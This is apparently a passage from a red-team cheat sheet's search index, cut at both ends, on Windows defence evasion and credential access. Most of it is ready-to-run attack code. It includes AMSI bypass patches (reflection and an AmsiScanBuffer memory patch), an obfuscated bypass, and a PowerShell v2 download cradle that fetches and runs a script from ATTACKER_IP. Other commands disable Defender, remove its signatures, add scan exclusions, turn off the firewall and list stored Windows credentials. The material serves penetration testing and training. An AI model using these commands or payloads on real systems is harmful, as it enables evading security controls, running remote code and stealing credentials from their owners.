[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)\n            }\n        }\n\n        \"dllhijack\"\n        {\n            Write-Verbose \"Using Cornelis de Plaa's DLL hijack method.\"\n            if ($ShowOnly -eq $True)\n            {\n                Write-Output \"Copy powershell.exe from C:\\Windows\\System32\\WindowsPowershell\\v1.0 to a local folder and dropa fake amsi.dll in the same directory.\"\n                Write-Output \"Run the new powershell.exe and AMSI should be gone for that session.\"\n            }\n            else\n            {\n                [Byte[]] $temp = $DllBytes -split ' '                \n                Write-Output \"Executing the bypass.\"\n                Write-Verbose \"Dropping the fake amsi.dll to disk.\"\n                [System.IO.File]::WriteAllBytes(\"$pwd\\amsi.dll\", $temp)\n\n                Write-Verbose \"Copying powershell.exe to the current working directory.\"\n                Copy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd\n\n                Write-Verbose \"Starting powershell.exe from the current working directory.\"\n                &amp; \"$pwd\\powershell.exe\"\n\n            }\n        }\n\n        \"psv2\"\n        {\n            Write-Verbose \"Using PowerShell version 2 which doesn't support AMSI.\"\n            if ($ShowOnly -eq $True)\n            {\n                Write-Output \"If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\"\n            }\n            else\n            {\n                Write-Verbose \"Checking if .Net version 2.0.50727 is installed.\"\n                $versions = Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\\p{L}'} | Select -ExpandProperty Version\n                if($versions -match \"2.0.50727\")\n                {\n                    Write-Verbose \".Net version 2.0.50727 found.\"\n                    Write-Output \"Executing the bypass.\"\n                    powershell.exe -version 2\n                }\n                else\n                {\n                    Write-Verbose \".Net version 2.0.50727 not found. Can't start PowerShell v2.\"\n                }\n            }\n        }\n\n        \"obfuscation\"\n        {\n            Write-Output \"AMSI and the AVs which support it can be bypassed using obfuscation techqniues.\"\n            Write-Output \"ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation).\"\n        }\n    }\n\n}\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#adam-chester-patch","title":"Adam Chester Patch","text":"<p>Bypass Update by Adam Chester https://twitter.com/xpn/status/1170852932650262530</p> <pre><code>$Winpatch = @\"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class patch\n{\n    // https://twitter.com/_xpn_/status/1170852932650262530\n    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };\n    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };\n\n    public static void it()\n    {\n        if (is64Bit())\n            PatchAmsi(x64);\n        else\n            PatchAmsi(x86);\n    }\n\n    private static void PatchAmsi(byte[] patch)\n    {\n        try\n        {\n            var lib = Win32.LoadLibrary(\"a\" + \"ms\" + \"i.dll\");\n            var addr = Win32.GetProcAddress(lib, \"AmsiScanBuffer\");\n\n            uint oldProtect;\n            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);\n\n            Marshal.Copy(patch, 0, addr, patch.Length);\n            Console.WriteLine(\"Patch Sucessfull\");\n        }\n        catch (Exception e)\n        {\n            Console.WriteLine(\" [x] {0}\", e.Message);\n            Console.WriteLine(\" [x] {0}\", e.InnerException);\n        }\n    }\n\n    private static bool is64Bit()\n        {\n            bool is64Bit = true;\n\n            if (IntPtr.Size == 4)\n                is64Bit = false;\n\n            return is64Bit;\n        }\n}\n\nclass Win32\n{\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\n\nAdd-Type -TypeDefinition $Winpatch -Language CSharp\n[patch]::it()\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#other-interesting-amsi-bypass","title":"Other interesting AMSI bypass","text":"<ul> <li>tihanyin/PSSW100AVB/AMSI_bypass_2021_09.ps1 <pre><code>$A=\"5492868772801748688168747280728187173688878280688776828\"\n$B=\"1173680867656877679866880867644817687416876797271\"\n[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace \" \" ).GetField([string](38..51|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace \" \",'Non' + 'Public,Static').SetValue($null,$true)\n</code></pre></li> </ul>"},{"location":"redteam/evasion/windows-amsi-bypass/#amsifail","title":"AMSI.fail","text":"<p>AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures. - https://amsi.fail/</p>"},{"location":"redteam/evasion/windows-amsi-bypass/#references","title":"References","text":"<ul> <li>S3cur3Th1sSh1t - Amsi-Bypass-Powershell</li> </ul>"},{"location":"redteam/evasion/windows-defenses/","title":"Windows - Defenses","text":""},{"location":"redteam/evasion/windows-defenses/#summary","title":"Summary","text":"<ul> <li>AppLocker</li> <li>User Account Control</li> <li>DPAPI</li> <li>Powershell<ul> <li>Anti Malware Scan Interface</li> <li>Just Enough Administration</li> <li>Contrained Language Mode</li> <li>Script Block Logging</li> </ul> </li> <li>Protected Process Light</li> <li>Credential Guard</li> <li>Event Tracing for Windows</li> <li>Attack Surface Reduction</li> <li>Windows Defender Antivirus</li> <li>Windows Defender Application Control</li> <li>Windows Defender Firewall</li> <li>Windows Information Protection</li> </ul>"},{"location":"redteam/evasion/windows-defenses/#applocker","title":"AppLocker","text":"<p>AppLocker is a security feature in Microsoft Windows that provides administrators with the ability to control which applications and files users are allowed to run on their systems. The rules can be based on various criteria, such as the file path, file publisher, or file hash, and can be applied to specific users or groups.</p> <ul> <li> <p>Enumerate Local AppLocker Effective Policy     <pre><code>PowerView PS C:\\&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\nPowerView PS C:\\&gt; Get-AppLockerPolicy -effective -xml\nGet-ChildItem -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Exe # (Keys: Appx, Dll, Exe, Msi and Script\n</code></pre></p> </li> <li> <p>AppLocker Bypass</p> <ul> <li>By default, <code>C:\\Windows</code> is not blocked, and <code>C:\\Windows\\Tasks</code> is writtable by any users</li> <li>api0cradle/UltimateAppLockerByPassList/Generic-AppLockerbypasses.md</li> <li>api0cradle/UltimateAppLockerByPassList/VerifiedAppLockerBypasses.md</li> <li>api0cradle/UltimateAppLockerByPassList/DLL-Execution.md</li> </ul> </li> </ul>"},{"location":"redteam/evasion/windows-defenses/#user-account-control","title":"User Account Control","text":"<p>UAC stands for User Account Control. It is a security feature introduced by Microsoft in Windows Vista and is present in all subsequent versions of the Windows operating system. UAC helps mitigate the impact of malware and helps protect users by asking for permission or an administrator's password before allowing changes to be made to the system that could potentially affect all users of the computer.</p> <ul> <li>Check if UAC is enabled     <pre><code>REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA\n</code></pre></li> <li>Check UAC level     <pre><code>REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin\nREG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v FilterAdministratorToken\n</code></pre></li> </ul> EnableLUA LocalAccountTokenFilterPolicy FilterAdministratorToken Description 0 / / No UAC 1 1 / No UAC 1 0 0 No UAC for RID 500 1 0 1 UAC for Everyone <ul> <li>UAC Bypass<ul> <li>AutoElevated binary signed by Microsoft - <code>msconfig</code>, <code>sdclt.exe</code>, <code>eventvwr.exe</code>, etc</li> <li>hfiref0x/UACME - Defeating Windows User Account Control</li> </ul> </li> </ul>"},{"location":"redteam/evasion/windows-defenses/#dpapi","title":"DPAPI","text":"<p>Refer to PayloadsAllTheThings/Windows - DPAPI.md</p>"},{"location":"redteam/evasion/windows-defenses/#powershell","title":"Powershell","text":""},{"location":"redteam/evasion/windows-defenses/#anti-malware-scan-interface","title":"Anti Malware Scan Interface","text":"<p>The Anti-Malware Scan Interface (AMSI) is a Windows API (Application Programming Interface) that provides a unified interface for applications and services to integrate with any anti-malware product installed on a system. The API allows anti-malware solutions to scan files and scripts at runtime, and provides a means for applications to request a scan of specific content.</p> <p>Find more AMSI bypass: Windows - AMSI Bypass.md</p> <pre><code>PS C:\\&gt; [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)\n</code></pre>"},{"location":"redteam/evasion/windows-defenses/#just-enough-administration","title":"Just Enough Administration","text":"<p>Just-Enough-Administration (JEA) is a feature in Microsoft Windows Server that allows administrators to delegate specific administrative tasks to non-administrative users. JEA provides a secure and controlled way to grant limited, just-enough access to systems, while ensuring that the user cannot perform unintended actions or access sensitive information.</p> <p>Breaking out if JEA: * List available cmdlets: <code>command</code> * Look for non-default cmdlets:     <pre><code>Set-PSSessionConfiguration\nStart-Process\nNew-Service\nAdd-Computer\n</code></pre></p>"},{"location":"redteam/evasion/windows-defenses/#constrained-language-mode","title":"Constrained Language Mode","text":"<p>Check if we are in a constrained mode: <code>$ExecutionContext.SessionState.LanguageMode</code></p> <ul> <li> <p>Bypass using an old Powershell. Powershell v2 doesn't support CLM.     <pre><code>powershell.exe -version 2\npowershell.exe -version 2 -ExecutionPolicy bypass\npowershell.exe -v 2 -ep bypass -command \"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')\"\n</code></pre></p> </li> <li> <p>Bypass when <code>__PSLockDownPolicy</code> is used. Just put \"System32\" somewhere in the path.      <pre><code># Enable CLM from the environment\n[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')\nGet-ChildItem -Path Env:\n\n# Create a check-mode.ps1 containing your \"evil\" powershell commands\n$mode = $ExecutionContext.SessionState.LanguageMode\nwrite-host $mode\n\n# Simple bypass, execute inside a System32 folder\nPS C:\\&gt; C:\\Users\\Public\\check-mode.ps1\nConstrainedLanguage\n\nPS C:\\&gt; C:\\Users\\Public\\System32\\check-mode.ps1\nFullLanguagge\n</code></pre></p> </li> <li> <p>Bypass using COM: xpn/COM_to_registry.ps1</p> </li> <li>Bypass using your own Powershell DLL: p3nt4/PowerShdll &amp; iomoath/PowerShx <pre><code>rundll32 PowerShdll,main &lt;script&gt;\nrundll32 PowerShdll,main -h      Display this message\nrundll32 PowerShdll,main -f &lt;path&gt;       Run the script passed as argument\nrundll32 PowerShdll,main -w      Start an interactive console in a new window (Default)\nrundll32 PowerShdll,main -i      Start an interactive console in this console\n\nrundll32 PowerShx.dll,main -e                           &lt;PS script to run&gt;\nrundll32 PowerShx.dll,main -f &lt;path&gt;                    Run the script passed as argument\nrundll32 PowerShx.dll,main -f &lt;path&gt; -c &lt;PS Cmdlet&gt;     Load a script and run a PS cmdlet\nrundll32 PowerShx.dll,main -w                           Start an interactive console in a new window\nrundll32 PowerShx.dll,main -i                           Start an interactive console\nrundll32 PowerShx.dll,main -s                           Attempt to bypass AMSI\nrundll32 PowerShx.dll,main -v                           Print Execution Output to the console\n</code></pre></li> </ul>"},{"location":"redteam/evasion/windows-defenses/#script-block-logging","title":"Script Block Logging","text":"<p>Once Script Block Logging is enabled, the script blocks and commands that are executed will be recorded in the Windows event log under the \"Windows PowerShell\" channel. To view the logs, administrators can use the Event Viewer application and navigate to the \"Windows PowerShell\" channel.</p> <p>Enable Script Block Loggin:</p> <pre><code>function Enable-PSScriptBlockLogging\n{\n    $basePath = 'HKLM:\\Software\\Policies\\Microsoft\\Windows' +\n      '\\PowerShell\\ScriptBlockLogging'\n\n    if(-not (Test-Path $basePath))\n    {\n        $null = New-Item $basePath -Force\n    }\n\n    Set-ItemProperty $basePath -Name EnableScriptBlockLogging -Value \"1\"\n}\n</code></pre>"},{"location":"redteam/evasion/windows-defenses/#protected-process-light","title":"Protected Process Light","text":"<p>Protected Process Light (PPL) is implemented as a Windows security mechanism that enables processes to be marked as \"protected\" and run in a secure, isolated environment, where they are shielded from attacks by malware or other unauthorized processes. PPL is used to protect processes that are critical to the operation of the operating system, such as anti-virus software, firewalls, and other security-related processes.</p> <p>When a process is marked as \"protected\" using PPL, it is assigned a security level that determines the level of protection it will receive. This security level can be set to one of several levels, ranging from low to high. Processes that are assigned a higher security level are given more protection than those that are assigned a lower security level.</p> <p>A process's protection is defined by a combination of the \"level\" and the \"signer\". The following table represent commonly used combinations, from itm4n.github.io.</p> Protection level Value Signer Type PS_PROTECTED_SYSTEM 0x72 WinSystem (7) Protected (2) PS_PROTECTED_WINTCB 0x62 WinTcb (6) Protected (2) PS_PROTECTED_WINDOWS 0x52 Windows (5) Protected (2) PS_PROTECTED_AUTHENTICODE 0x12 Authenticode (1) Protected (2) PS_PROTECTED_WINTCB_LIGHT 0x61 WinTcb (6) Protected Light (1) PS_PROTECTED_WINDOWS_LIGHT 0x51 Windows (5) Protected Light (1) PS_PROTECTED_LSA_LIGHT 0x41 Lsa (4) Protected Light (1) PS_PROTECTED_ANTIMALWARE_LIGHT 0x31 Antimalware (3) Protected Light (1) PS_PROTECTED_AUTHENTICODE_LIGHT 0x11 Authenticode (1) Protected Light (1) <p>PPL works by restricting access to the protected process's memory and system resources, and by preventing the process from being modified or terminated by other processes or users. The process is also isolated from other processes running on the system, which helps prevent attacks that attempt to exploit shared resources or dependencies.</p> <ul> <li>Check if LSASS is running in PPL     <pre><code>reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL\n</code></pre></li> <li>Protected process example: you can't kill Microsoft Defender even with Administrator privilege.     <pre><code>taskkill /f /im MsMpEng.exe\nERROR: The process \"MsMpEng.exe\" with PID 5784 could not be terminated.\nReason: Access is denied.\n</code></pre></li> <li>Can be disabled using vulnerable drivers (Bring Your Own Vulnerable Driver / BYOVD)</li> </ul>"},{"location":"redteam/evasion/windows-defenses/#credential-guard","title":"Credential Guard","text":"<p>When Credential Guard is enabled, it uses hardware-based virtualization to create a secure environment that is separate from the operating system. This secure environment is used to store sensitive credential information, which is encrypted and protected from unauthorized access. </p> <p>Credential Guard uses a combination of hardware-based virtualization and the Trusted Platform Module (TPM) to ensure that the secure kernel is trusted and secure. It can be enabled on devices that have a compatible processor and TPM version, and require a UEFI firmware that supports the necessary features.</p>"},{"location":"redteam/evasion/windows-defenses/#event-tracing-for-windows","title":"Event Tracing for Windows","text":"<p>ETW (Event Tracing for Windows) is a Windows-based logging mechanism that provides a way to collect and analyze system events and performance data in real-time. ETW allows developers and system administrators to gather detailed information about system performance and behavior, which can be used for troubleshooting, optimization, and security purposes.</p> Name GUID Microsoft-Antimalware-Scan-Interface {2A576B87-09A7-520E-C21A-4942F0271D67} Microsoft-Windows-PowerShell {A0C1853B-5C40-4B15-8766-3CF1C58F985A} Microsoft-Antimalware-Protection {E4B70372-261F-4C54-8FA6-A5A7914D73DA} Microsoft-Windows-Threat-Intelligence {F4E1897C-BB5D-5668-F1D8-040F4D8DD344} <p>You can see all the providers registered to Windows using: <code>logman query providers</code></p> <pre><code>PS C:\\Users\\User\\Documents&gt; logman query providers\n\nProvider                                 GUID\n-------------------------------------------------------------------------------\n.NET Common Language Runtime             {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}\nACPI Driver Trace Provider               {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}\nActive Directory Domain Services: SAM    {8E598056-8993-11D2-819E-0000F875A064}\nActive Directory: Kerberos Client        {BBA3ADD2-C229-4CDB-AE2B-57EB6966B0C4}\nActive Directory: NetLogon               {F33959B4-DBEC-11D2-895B-00C04F79AB69}\nADODB.1                                  {04C8A86F-3369-12F8-4769-24E484A9E725}\nADOMD.1                                  {7EA56435-3F2F-3F63-A829-F0B35B5CAD41}\n...\n</code></pre> <p>We can get more information about the provider using:  <code>logman query providers {ProviderID}/Provider-Name</code></p> <pre><code>PS C:\\Users\\User\\Documents&gt; logman query providers Microsoft-Antimalware-Scan-Interface\n\nProvider                                 GUID\n-------------------------------------------------------------------------------\nMicrosoft-Antimalware-Scan-Interface     {2A576B87-09A7-520E-C21A-4942F0271D67}\n\nValue               Keyword              Description\n-------------------------------------------------------------------------------\n0x0000000000000001  Event1\n0x8000000000000000  AMSI/Debug\n\nValue               Level                Description\n-------------------------------------------------------------------------------\n0x04                win:Informational    Information\n\nPID                 Image\n-------------------------------------------------------------------------------\n0x00002084          C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n0x00002084          C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n0x00001bd4\n0x00000ad0\n0x00000b98\n</code></pre> <p>The <code>Microsoft-Windows-Threat-Intelligence</code> provider corresponds to ETWTI, an additional security feature that an EDR can subscribe to and identify malicious uses of APIs (e.g. process injection).</p> <pre><code>0x0000000000000001  KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL\n0x0000000000000002  KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER\n0x0000000000000004  KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE\n0x0000000000000008  KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER\n0x0000000000000010  KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL\n0x0000000000000020  KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER\n0x0000000000000040  KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE\n0x0000000000000080  KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER\n0x0000000000000100  KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL\n0x0000000000000200  KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER\n0x0000000000000400  KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE\n0x0000000000000800  KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER\n0x0000000000001000  KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE\n0x0000000000002000  KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER\n0x0000000000004000  KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE\n0x0000000000008000  KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER\n0x0000000000010000  KERNEL_THREATINT_KEYWORD_READVM_LOCAL\n0x0000000000020000  KERNEL_THREATINT_KEYWORD_READVM_REMOTE\n0x0000000000040000  KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL\n0x0000000000080000  KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE\n0x0000000000100000  KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD\n0x0000000000200000  KERNEL_THREATINT_KEYWORD_RESUME_THREAD\n0x0000000000400000  KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS\n0x0000000000800000  KERNEL_THREATINT_KEYWORD_RESUME_PROCESS\n</code></pre> <p>The most common bypassing technique is patching the function <code>EtwEventWrite</code> which is called to write/log ETW events. You can list the providers registered for a process with <code>logman query providers -pid &lt;PID&gt;</code></p>"},{"location":"redteam/evasion/windows-defenses/#attack-surface-reduction","title":"Attack Surface Reduction","text":"<p>Attack Surface Reduction (ASR) refers to strategies and techniques used to decrease the potential points of entry that attackers could use to exploit a system or network.</p> <pre><code>Add-MpPreference -AttackSurfaceReductionRules_Ids &lt;Id&gt; -AttackSurfaceReductionRules_Actions AuditMode\nAdd-MpPreference -AttackSurfaceReductionRules_Ids &lt;Id&gt; -AttackSurfaceReductionRules_Actions Enabled\n</code></pre> Description Id Block execution of potentially obfuscated scripts 5beb7efe-fd9a-4556-801d-275e5ffc04cc Block JavaScript or VBScript from launching downloaded executable content d3e037e1-3eb8-44c8-a917-57927947596d Block abuse of exploited vulnerable signed drivers 56a863a9-875e-4185-98a7-b882c64b5ce5 Block executable content from email client and webmail be9ba2d9-53ea-4cdc-84e5-9b1eeee46550 Block process creations originating from PSExec and WMI commands d1e49aac-8f56-4280-b9ba-993a6d77406c Use advanced protection against ransomware c1db55ab-c21a-4637-bb3f-a12568109d35 Block credential stealing from the Windows local security authority subsystem (lsass.exe) 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2"},{"location":"redteam/evasion/windows-defenses/#windows-defender-antivirus","title":"Windows Defender Antivirus","text":"<p>Also known as <code>Microsoft Defender</code>.</p> <pre><code># check status of Defender\nPS C:\\&gt; Get-MpComputerStatus\n\n# disable scanning all downloaded files and attachments, disable AMSI (reactive)\nPS C:\\&gt; Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus\nPS C:\\&gt; Set-MpPreference -DisableIOAVProtection $true\n\n# disable AMSI (set to 0 to enable)\nPS C:\\&gt; Set-MpPreference -DisableScriptScanning 1 \n\n# exclude a folder\nPS C:\\&gt; Add-MpPreference -ExclusionPath \"C:\\Temp\"\nPS C:\\&gt; Add-MpPreference -ExclusionPath \"C:\\Windows\\Tasks\"\nPS C:\\&gt; Set-MpPreference -ExclusionProcess \"word.exe\", \"vmwp.exe\"\n\n# exclude using wmi\nPS C:\\&gt; WMIC /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\"C:\\Users\\Public\\wmic\"\n\n# remove signatures (if Internet connection is present, they will be downloaded again):\nPS &gt; &amp; \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" -RemoveDefinitions -All\nPS &gt; &amp; \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n</code></pre>"},{"location":"redteam/evasion/windows-defenses/#windows-defender-application-control","title":"Windows Defender Application Control","text":"<p>Also known as <code>WDAC/UMCI/Device Guard</code>.</p> <p>Windows Defender Application Guard, formerly known as Device Guard has the power to control if an application may or may not be executed on a Windows device. WDAC will prevent the execution, running, and loading of unwanted or malicious code, drivers, and scripts. WDAC does not trust any software it does not know of.</p> <ul> <li>Get WDAC current mode     <pre><code>$ Get-ComputerInfo\nDeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode\nDeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : EnforcementMode\n</code></pre></li> <li>Remove WDAC policies using CiTool.exe (Windows 11 2022 Update)     <pre><code>$ CiTool.exe -rp \"{PolicyId GUID}\" -json\n</code></pre></li> <li>Device Guard policy location: <code>C:\\Windows\\System32\\CodeIntegrity\\CiPolicies\\Active\\{PolicyId GUID}.cip</code></li> <li>Device Guard example policies: <code>C:\\Windows\\System32\\CodeIntegrity\\ExamplePolicies\\</code></li> <li>WDAC utilities: mattifestation/WDACTools, a PowerShell module to facilitate building, configuring, deploying, and auditing Windows Defender Application Control (WDAC) policies</li> <li>WDAC bypass techniques: bohops/UltimateWDACBypassList<ul> <li>nettitude/Aladdin - WDAC Bypass using AddInProcess.exe</li> </ul> </li> </ul>"},{"location":"redteam/evasion/windows-defenses/#windows-defender-firewall","title":"Windows Defender Firewall","text":"<ul> <li> <p>List firewall state and current configuration     <pre><code>netsh advfirewall firewall dump\n# or \nnetsh firewall show state\nnetsh firewall show config\n</code></pre></p> </li> <li> <p>List firewall's blocked ports     <pre><code>$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq \"0\"} | select name,applicationname,localports\n</code></pre></p> </li> <li> <p>Disable firewall     <pre><code># Disable Firewall via cmd\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"  /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\n# Disable Firewall via Powershell\npowershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\" -Name \"fDenyTSConnections\" \u2013Value'`\n\n# Disable Firewall on any windows using native command\nnetsh firewall set opmode disable\nnetsh Advfirewall set allprofiles state off\n</code></pre></p> </li> </ul>"},{"location":"redteam/evasion/windows-defenses/#windows-information-protection","title":"Windows Information Protection","text":"<p>Windows Information Protection (WIP), formerly known as Enterprise Data Protection (EDP), is a security feature in Windows 10 that helps protect sensitive data on enterprise devices. WIP helps to prevent accidental data leakage by allowing administrators to define policies that control how enterprise data can be accessed, shared, and protected. WIP works by identifying and separating enterprise data from personal data on the device. </p> <p>Protection of file (data) locally marked as corporate is facilitated via Encrypting File System (EFS) encryption of Windows (a feature of NTFS file system)</p> <ul> <li>Enumerate files attributes, <code>Encrypted</code> attribute is used for files protected by WIP     <pre><code>PS C:\\&gt; (Get-Item -Path 'C:\\...').attributes\nArchive, Encrypted\n</code></pre></li> <li>Encrypt files: <code>cipher /c encryptedfile.extension</code></li> <li>Decrypt files: <code>cipher /d encryptedfile.extension</code></li> </ul> <p>The Enterprise Context column shows you what each app can do with your enterprise data:</p> <ul> <li>Domain. Shows the employee's work domain (such as, corp.contoso.com). This app is considered work-related and can freely touch and open work data and resources.</li> <li>Personal. Shows the text, Personal. This app is considered non-work-related and can't touch any work data or resources.</li> <li>Exempt. Shows the text, Exempt. Windows Information Protection policies don't apply to these apps (such as, system components).</li> </ul>"},{"location":"redteam/evasion/windows-defenses/#bitlocker-drive-encryption","title":"BitLocker Drive Encryption","text":"<p>BitLocker is a full-disk encryption feature included in Microsoft Windows operating systems starting with Windows Vista. It is designed to protect data by providing encryption for entire volumes. BitLocker uses AES encryption algorithm to encrypt data on the disk. When enabled, BitLocker requires a user to enter a password or insert a USB flash drive to unlock the encrypted volume before the operating system is loaded, ensuring that data on the disk is protected from unauthorized access. BitLocker is commonly used on laptops, portable storage devices, and other mobile devices to protect sensitive data in case of theft or loss.</p> <p>When BitLocker is in <code>Suspended</code> state, boot the system using a Windows Setup USB, and then decrypt the drive using this command: <code>manage-bde -off c:</code></p> <p>You can check if it is done decrypting using this command: <code>manage-bde -status</code></p>"},{"location":"redteam/evasion/windows-defenses/#references","title":"References","text":"<ul> <li>SNEAKING PAST DEVICE GUARD - Cybereason - Philip Tsukerman</li> <li>PowerShell about_Logging_Windows - Microsoft Documentation</li> <li>Do You Really Know About LSA Protection (RunAsPPL)? - itm4n - Apr 7, 2021</li> <li>Determine the Enterprise Context of an app running in Windows Information Protection (WIP) - 03/10/2023 - Microsoft</li> <li>Create and verify an Encrypting File System (EFS) Data Recovery Agent (DRA) certificate - 12/09/2022 - Microsoft</li> <li>DISABLING AV WITH PROCESS SUSPENSION - March 24, 2023 - By Christopher Paschen </li> <li>Disabling Event Tracing For Windows - UNPROTECT PROJECT - Tuesday 19 April 2022</li> <li>ETW: Event Tracing for Windows 101 - ired.team</li> <li>Remove Windows Defender Application Control (WDAC) policies - Microsoft - 12/09/2022</li> <li>Attack surface reduction rules reference - Microsoft 365 - 11/30/2023</li> </ul>"},{"location":"redteam/evasion/windows-dpapi/","title":"Windows - DPAPI","text":"<p>On Windows, credentials saved in the Windows Credentials Manager are encrypted using Microsoft's Data Protection API and stored as \"blob\" files in user AppData folder.</p>"},{"location":"redteam/evasion/windows-dpapi/#summary","title":"Summary","text":"<ul> <li>Data Protection API<ul> <li>List Credential Files</li> <li>DPAPI LocalMachine Context</li> <li>Mimikatz - Credential Manager &amp; DPAPI</li> <li>Hekatomb - Steal all credentials on domain</li> <li>DonPAPI - Dumping DPAPI credz remotely</li> </ul> </li> </ul>"},{"location":"redteam/evasion/windows-dpapi/#data-protection-api","title":"Data Protection API","text":"<ul> <li>Outside of a domain: the user's <code>password hash</code> is used to encrypt these \"blobs\".</li> <li>Inside a domain: the <code>domain controller's master key</code> is used to encrypt these blobs.</li> </ul> <p>With the extracted private key of the domain controller, it is possible to decrypt all the blobs, and therefore to recover all the secrets recorded in the Windows identification manager of all the work stations in the domain.</p> <pre><code>vaultcmd /list\n\nVaultCmd /listcreds:&lt;namevault&gt;|&lt;guidvault&gt; /all\nvaultcmd /listcreds:\"Windows Credentials\" /all\n</code></pre>"},{"location":"redteam/evasion/windows-dpapi/#list-credential-files","title":"List Credential Files","text":"<pre><code>dir /a:h C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\n\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\n</code></pre>"},{"location":"redteam/evasion/windows-dpapi/#dpapi-localmachine-context","title":"DPAPI LocalMachine Context","text":"<p>The <code>LocalMachine</code> context is used to protect data that is intended to be shared across different users or services on a single machine. This means that any user or service running on the machine can access the protected data with the appropriate credentials.</p> <p>In contrast, the <code>CurrentUser</code> context is used to protect data that is intended to be accessed only by the user who encrypted it, and cannot be accessed by other users or services on the same machine.</p> <pre><code>$a = [System.Convert]::FromBase64String(\"AQAAANCMnd[...]\")\n$b = [System.Security.Cryptography.ProtectedData]::Unprotect($a, $null, 